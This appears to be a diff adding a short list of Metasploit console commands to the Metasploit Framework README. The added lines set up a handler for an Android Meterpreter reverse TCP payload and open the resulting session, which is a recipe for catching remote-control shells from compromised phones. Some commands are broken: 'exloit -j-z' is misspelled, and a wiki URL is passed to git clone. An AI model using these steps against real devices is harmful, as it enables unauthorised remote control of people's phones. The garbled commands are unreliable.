@@ -45,5 +45,15 @@ pull request. For slightly more information, see
 [wiki-start]: https://github.com/rapid7/metasploit-framework/wiki/ "Metasploit Wiki"
 [wiki-usage]: https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit "Using Metasploit"
 [unleashed]: https://www.offensive-security.com/metasploit-unleashed/ "Metasploit Unleashed"
+commands used 
+git clone https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers
+msfconsole
+use exploit/multi/handler
+set payload android/meterpreter/reverse_tcp
+set lhost
+set lport
+exloit -j-z
+sessions -i 1
+
 
 
